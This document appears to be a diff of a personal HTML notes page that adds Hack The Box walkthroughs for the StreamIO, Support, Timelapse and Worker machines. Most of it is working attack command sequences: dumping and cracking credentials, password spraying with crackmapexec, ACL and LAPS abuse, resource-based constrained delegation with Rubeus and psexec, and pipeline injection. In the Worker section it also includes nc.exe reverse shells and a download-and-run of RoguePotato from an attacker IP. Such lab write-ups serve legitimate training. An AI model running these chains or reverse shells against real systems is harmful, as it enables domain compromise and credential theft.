+                        <br>PS C:\inetpub\streamio.htb> dir -recurse *.php | select-string -pattern "database"
+                        <br>besides the index.php we have exfiled, login.php and register.php also have db_admin:B1@hx31234567890
+                        <br>PS C:\> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"  only 2 tabls: movies,users
+                        <br>PS C:\> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
+                        <br>save usernames and hashes, crack `crackmapexec smb 10.10.11.158 -u user -p pass --continue-on-success --no-bruteforce` got cred nikk37:get_dem_girls2@yahoo.com
+                        <br>winrm also works `crackmapexec winrm 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'`
+                        <br>`evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i 10.10.11.158`
+                        <br><span class="step_title">Privilege_escalation(nikk37->JDgodd)</span>
+                        <br>winpeas.exe found firefox cred file at C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release\
+                        <br>https://github.com/lclevy/firepwd  transfer key4.db and logins.json from target to a folder on kali
+                        <br>`python3 ./firepwd-master/firepwd.py -d ./firefoxprofile` save usernames and passwords
+                        <br>`crackmapexec smb 10.10.11.158 -u ./firefoxprofile/users.txt -p ./firefoxprofile/passwords.txt --continue-on-success` get cred JDgodd:JDg0dd1s@d0p3cr3@t0r
+                        <br>winrm don't work, but we can enum further with 'JDgodd'
+                        <br><span class="step_title">Privilege_escalation(JDgodd->administrator)</span>
+                        <br>Failed(can't connect dc.streamio.htb): `bloodhound-python -c All -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.10.11.158 -d streamio.htb -dc streamio.htb --zip`
+                        <br>after add 'dc.streamio.htb' to /etc/hosts and `ntpdate -s 10.10.11.158`
+                        <br>`bloodhound-python -c All -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.10.11.158 -d streamio.htb -dc streamio.htb --zip`
+                        <br>in bloodhound, user 'jdgodd' has 'WriteOwner' over 'CORE STAFF' group which has 'ReadLAPSPassword' over 'DC.STREAMIO.HTB' computer
+                        <br>*Evil-WinRM* PS C:\programdata> upload PowerView.ps1
+                        <br>*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
+                        <br>Add user 'JDgodd' to 'CORE STAFF' group
+                        <br>0xdf: $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
+                        <br>0xdf: $cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
+                        <br>0xdf: Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
+                        <br>0xdf: Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
+                        <br>0xdf: net user jdgodd
+                        <br>ippsec: $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
+                        <br>ippsec: $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
+                        <br>ippsec: Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $Cred
+                        <br>ippsec: Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
+                        <br>ippsec: Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
+                        <br>ippsec: net group 'CORE STAFF'
+                        <br>method_1 'ReadLAPSPassword' by property on the computer object
+                        <br>*Evil-WinRM* PS C:\programdata> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
+                        <br>ms-Mcs-AdmPwd     : -Z4I/T1W0%+4nF
+                        <br>method_2 'ReadLAPSPassword' by ldapsearch 
+                        <br>`ldapsearch -h 10.10.11.158 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
+                        <br>ms-Mcs-AdmPwd: -Z4I/T1W0%+4nF
+                        <br>method_3 'ReadLAPSPassword' by crackmapexec
+                        <br>`crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds`
+                        <br>SMB         10.10.11.158    445    DC               [-] DC\administrator:-Z4I/T1W0%+4nF STATUS_LOGON_FAILURE
+                        <br>`evil-winrm -u administrator -p '-Z4I/T1W0%+4nF' -i 10.10.11.158`
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Support (Easy/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>`smbmap -H 10.10.11.174 -u anonymous -R`  found .\support-tools\UserInfo.exe.zip
+                        <br>Failed(no perm): `smbget -U anonymous smb://10.10.11.174/support-tools/UserInfo.exe.zip`
+                        <br>`smbclient //10.10.11.174/support-tools` smb: \> get UserInfo.exe.zip
+                        <br>`mkdir UserInfo; unzip UserInfo.exe.zip -d UserInfo`
+                        <br>Failed(both not work) `pwsh` OR `wine UserInfo.exe -v find -first '*'`
+                        <br>transfer to commando(windows VM) edit C:\Windows\System32\drivers\etc\hosts 'support.htb'
+                        <br>PS > .\UserInfo.exe find -first '*'
+                        <br>wireshark capture cred ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+                        <br>Nothing_interesting: `bloodhound-python -c ALL --zip -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174`
+                        <br>`ldapsearch -x -H ldap://10.10.11.174 -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" > ldapsearch_ldap.txt`
+                        <br>found suspectpass 'Ironside47pleasure40Watchful' under 'support' user object
+                        <br>`crackmapexec winrm support.htb -u support -p 'Ironside47pleasure40Watchful'` test good
+                        <br>`evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'`
+                        <br><span class="step_title">Privilege_escalation(support->domain_admin)</span>
+                        <br>user 'support' is in 'Shared Support Accounts' group, which has 'GenericAll' over 'DC.SUPPORT.HTB' computer object
+                        <br>based on bloodhound GenericAll abuse_info: Full control of a computer object can be used to perform 'resource-based constrained delegation' attack
+                        <br>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+                        <br>https://github.com/Kevin-Robertson/Powermad
+                        <br>https://github.com/GhostPack/Rubeus
+                        <br>just use the pre-compiled rubeus.exe upload to target
+                        <br>*****[Resource Based Constrained Delegation] ippsec: 
+                        <br>we can add a computer($FAKE-COMP01) under our control to the domain and configure the Domain Controller to allow $FAKE-COMP01 to act on behalf of it. 
+                        <br>Then, by acting on behalf of the DC we can request Kerberos tickets for  $FAKE-COMP01 , with the ability to impersonate a highly privileged user on the Domain, such as the  Administrator . 
+                        <br>After the Kerberos tickets are generated, we can Pass the Ticket (PtT) and authenticate as this privileged user, giving us control over the entire domain.
+                        <br>`Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota` check if value greater than 0
+                        <br>`upload PowerView.ps1`  `. ./PowerView.ps1`
+                        <br>`Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity` check if value is empty
+                        <br>`upload Powermad.ps1`   `. ./Powermad.ps1`
+                        <br>=====Creating a Computer Object=====
+                        <br>`New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)`
+                        <br>`Get-ADComputer -identity FAKE-COMP01` check if it's created and SID assigned
+                        <br>=====Configuring RBCD(Resource-Based Constrained Delegation)=====
+                        <br>method_1 We can either set the  PrincipalsAllowedToDelegateToAccount  value to  FAKE-COMP01  through the builtin PowerShell Active Directory module, which will in turn configure the  msds-allowedtoactonbehalfofotheridentity  attribute on its own.
+                        <br>method_2 we can use the  PowerView  module to directly set the  msds-allowedtoactonbehalfofotheridentity  attribute.
+                        <br>ippsec only show method_1
+                        <br>`Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$`
+                        <br>`Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount`
+                        <br>`Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity` check if value is not empty
+                        <br>this attribute is 'Raw Security Descriptor' we will have to convert the bytes to a string to verify the SID of FAKE-COMP01$
+                        <br>`$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity`
+                        <br>`$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0`
+                        <br>`$Descriptor.DiscretionaryAcl` check the SecurityIdentifier with FAKE-COMP01$ and AceType: AccessAllowed
+                        <br>=====Performing a S4U Attack=====
+                        <br>'Service for User' attack, also known as 'Kerberos unconstrained delegation abuse'
+                        <br>`.\rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb` copy the value of 'rc4_hmac' then generate ticket for administrator
+                        <br>`.\rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt`
+                        <br>save the 'Administrator' user's base64 tricket string as ticket.kirbi.b64 on kali
+                        <br>`base64 -d ticket.kirbi.b64 > ticket.kirbi`
+                        <br>`ticketConverter.py ticket.kirbi ticket.ccache`
+                        <br>`KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass`
+                        <br>*****[Resource Based Constrained Delegation] 0xdf: 
+                        <br>First I’ll add a fake computer to the domain under my control. 
+                        <br>Then I can act as the DC to request Kerberos tickets for the fake computer giving the ability to impersonate other accounts(Administrator). 
+                        <br>For this to work, I’ll need an authenticated user who can add machines to the domain (by default, any user can add up to 10). 
+                        <br>This is configured in the ms-ds-machineaccountquota attribute, which needs to be larger than 0. 
+                        <br>Finally, I need write privileges over a domain joined computer (which GenericALL on the DC gets me.)
+                        <br>upload the 3 tools, and load 2, `. ./PowerView.ps1`  `. ./Powermad.ps1`
+                        <br>`Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota`  check if value greater than 0
+                        <br>`Get-DomainController | select name,osversion | fl`  check if OSVersion is 2012 later (2022)
+                        <br>`Get-DomainComputer DC | select name,msds-allowedtoactonbehalfofotheridentity | fl`  check if value is empty
+                        <br>=====Create FakeComputer=====
+                        <br>`New-MachineAccount -MachineAccount 0xdfFakeComputer -Password $(ConvertTo-SecureString '0xdf0xdf123' -AsPlainText -Force)`
+                        <br>`$fakesid = Get-DomainComputer 0xdfFakeComputer | select -expand objectsid`
+                        <br>`$fakesid` check it's assigned
+                        <br>=====configure the DC to trust my fake computer to make authorization decisions on it’s behalf
+                        <br>`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"`
+                        <br>`$SDBytes = New-Object byte[] ($SD.BinaryLength)`
+                        <br>`$SD.GetBinaryForm($SDBytes, 0)`
+                        <br>`Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}`
+                        <br>`$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity`
+                        <br>`$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0`
+                        <br>`$Descriptor.DiscretionaryAcl` check the SecurityIdentifier with FAKE-COMP01$ and AceType: AccessAllowed
+                        <br>If rerun bloodhound, we can see '0xdfFakeComputer.support.htb' computer_object now has 'AllowToAct' over 'dc.support.htb' computer_object
+                        <br>=====Auth as Fake Computer=====
+                        <br>`.\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb` copy 'rc4_hmac' value
+                        <br>=====get ticket=====
+                        <br>`.\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt`
+                        <br>`.\Rubeus.exe klist`
+                        <br>=====use ticket on kali=====
+                        <br>`base64 -d ticket.kirbi.b64 > ticket.kirbi`
+                        <br>`ticketConverter.py ticket.kirbi ticket.ccache`
+                        <br>`KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass`
                         <br>
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Mantis (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Timelapse (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>`crackmapexec smb dc01.timelapse.htb --shares -u 0xdf -p ''`
+                        <br>`smbclient -N //dc01.timelapse.htb/Shares` smb: \dev\> get winrm_backup.zip
+                        <br>`zip2john winrm_backup.zip > winrm_backup.zip.hash`
+                        <br>`john  --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.zip.hash` password: supremelegacy
+                        <br>`unzip -P supremelegacy winrm_backup.zip` got file: legacyy_dev_auth.pfx
+                        <br>https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file
+                        <br>`pfx2john.py legacyy_dev_auth.pfx | tee legacyy_dev_auth.pfx.hash` tee will save the output and display it at same time
+                        <br>`john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx.hash` password: thuglegacy (this will be the 'import password')
+                        <br>`openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc` PEM_pass need to be at least 4 chars
+                        <br>`openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key` decrypt it so that we never have to remember the PEM_pass
+                        <br>`openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt`
+                        <br>`evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt`  -S 'Enable SSL to connecting 5986'
+                        <br><span class="step_title">Privilege_escalation(legacyy->svc_deploy)</span>
+                        <br>winpeas.exe found cred svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV in C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+                        <br>`evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S`
+                        <br>'svc_deploy' user is in '*LAPS_Readers' group.  LAPS=Local Administrator Password Solution
+                        <br>google found me https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/ous/laps/  But I've never try: `Get-AdmPwdPassword –ComputerName dc01`
+                        <br>0xdf use: `Get-ADComputer DC01 -property 'ms-mcs-admpwd'` got ms-mcs-admpwd: uM[3va(s870g6Y]9i]6tMu{j
+                        <br>ippsec use: https://github.com/ztrhgf/LAPS/tree/master/AdmPwd.PS
+                        <br>`upload AdmPwd.PS`
+                        <br>`Find-AdmPwdExtendedRights -identity *` check what objects can manage the LAPS
+                        <br>`Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders` output only 3 group: SYSTEM,Domain_Admins,LAPS_Readers
+                        <br>`get-admpwdpassword -computername dc01 | Select password` got password: /1B@QZe3{BAAwzs%KY$pTb7d
+                        <br>`evil-winrm -i 10.10.11.152 -u administrator -p '/1B@QZe3{BAAwzs%KY$pTb7d' -S`
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Multimaster (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">Worker (Medium/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Netmon (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Object (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Omni (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Optimum (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Reel (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <!-- ---------------------------------------160--------------------------------------- -->
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Remote (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Resolute (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Sauna (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Scrambled (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Search (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Secnotes (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Servmon (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Silo (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Sizzle (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>StreamIO (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Support (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Timelapse (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Worker (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>nmap found 3690/tcp open  svnserve Subversion
+                        <br>Failed(link_expired): http://www.gcf.dkf.unibe.ch/BCB/files/BCB_Subversion_Cheat_Sheet.pdf
+                        <br>https://www.cheat-sheets.org/saved-copy/subversion-cheat-sheet-v1.pdf
+                        <br>`svn checkout svn://10.10.10.203`  this will copy the repo to local
+                        <br>`svn log` shows there were 5 commits, enum them one by one -r 1 .. -r 5
+                        <br>`svn update -r 2` found 'deploy.ps1' was 'A' added, found cred nathen:wendel98
+                        <br>`svn update -r 5` found 'moved.txt' was 'A' added, found http://devops.worker.htb 
+                        <br>`wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.10.203 -H 'Host: FUZZ.worker.htb' --hh 703` found other subdomain
+                        <br>/etc/hosts 10.10.10.203 worker.htb alpha.worker.htb story.worker.htb devops.worker.htb cartoon.worker.htb lens.worker.htb dimension.worker.htb twenty.worker.htb solid-state.worker.htb spectral.worker.htb
+                        <br>login devops.worker.htb as nathen:wendel98 >>SmartHotel360>>pick a site(e.g. Alpha-CI), in Tasks tab we found [TargetFolder: 'w:\sites\$(Build.Repository.Name).worker.htb']
+                        <br>Note: pipeline is a series of commands to run, presumably to build the updated site and deploy it. we can create pipeline and build but we can not push it to master branch
+                        <br>but we can clone(create based on) master repo, upload cmd.aspx and delpoy(queue build for Alpha-CI in pipeline). then we got webshell at alpha.worker.htb/cmd.aspx
+                        <br><span class="step_title">Privilege_escalation(iis–>robisl)</span>
+                        <br>`wmic logicaldisk get deviceid, volumename, description` and `powershell -c get-psdrive -psprovider filesystem` both shown there is a w: drive working
+                        <br>found lone list of user and pass in W:\svnrepos\www\conf\passwd
+                        <br>0xdf: `net localgroup "Remote Management Users"` found user 'robisl'
+                        <br>ippsec: `crackmapexec winrm 10.10.10.203 -u users -p passwords --no-bruteforce` found robisl:wolves11
+                        <br>`evil-winrm -i 10.10.10.203 -u robisl -p wolves11`
+                        <br><span class="step_title">Privilege_escalation(robisl->system)</span>
+                        <br>login devops.worker.htb as robisl:wolves11 
+                        <br>>>PartsUnlimited>>Project_Settings>Security>>Build_Administrators(group)>> found robisl, which has full control over pipelines in the project. we can create new build to run arbitrary commands
+                        <br>>>PartsUnlimited>>Project_Settings>Agent_pools>>Setup>>Agents>>Hamilton11>>Capabilities found USERNAME:WORKER$ which means the build will be ran by SYSTEM
+                        <br>0xdf: 
+                        <br>create new pipeline>>Azure_Repos_Git>>PartsUnlimited>>starter_pipeline>>default yaml>>create_new_branch...(we can't commit to master branch)>>save&run failed(there is no pool name called 'Default')
+                        <br>found 'Setup' in Collection_Settings>>agent_pool, edit the yaml, inject payload under 'script:'
+                        <br>0xdf_payload: - script: c:\programdata\nc.exe -e cmd 10.10.14.24 443
+                        <br>listener get SYSTEM shell
+                        <br>ippsec: 
+                        <br>create new pipeline>>Use_the_classic_editor>>continue(default)>>empty_pipeline>>choose 'Setup' in agent_pool>>add job 'Powershell'
+                        <br>ippsec_payload: net user cube Password123! /add ; net localgroup administrators cube /add
+                        <br>`evil-winrm -i 10.10.10.203 -u cube -p Password123!` got administrator shell
+                        <br><span class="step_title">short_cut(iis–>system)</span>
+                        <br>iis user `whoami /priv` has 'SeImpersonatePrivilege Enabled'
+                        <br>c:\ProgramData>powershell -c wget http://10.10.14.24/RoguePotato.exe -outfile RoguePotato.exe
+                        <br>https://github.com/antonioCoco/RoguePotato?tab=readme-ov-file
+                        <br>Normal steps: kali@root# socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.203:9999
+                        <br>Normal steps: c:\ProgramData> echo c:\programdata\nc.exe -e cmd 10.10.14.24 443 > .\rev.bat
+                        <br>Normal steps: c:\ProgramData> .\RoguePotato.exe -r 10.10.14.24 -l 9999 -e C:\programdata\rev.bat
+                        <br>Fail_cause_1: Windows Defender will detect and delete RoguePotato.exe
+                        <br>Fail_cause_2: Target Firewall block any inbound connection except 80/tcp http, 3690/tcp svn, 5985/tcp wsman
+                        <br>0xdf solution: 
+                        <br>countermeasure_1: download and run with a oneliner
+                        <br>countermeasure_2: use chisel forward kali:9999 to target:9999, which bypass the firewall
+                        <br>root@kali# ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
+                        <br>c:\ProgramData>.\chisel.exe client 10.10.14.24:8000 R:9999:localhost:9999
+                        <br>root@kali# socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999
+                        <br>c:\ProgramData>powershell -c wget 10.10.14.24/RoguePotato.exe -outfile r.exe; .\r.exe -r 10.10.14.24 -l 9999 -e C:\programdata\rev.bat
+                        <br>listener got SYSTEM shell
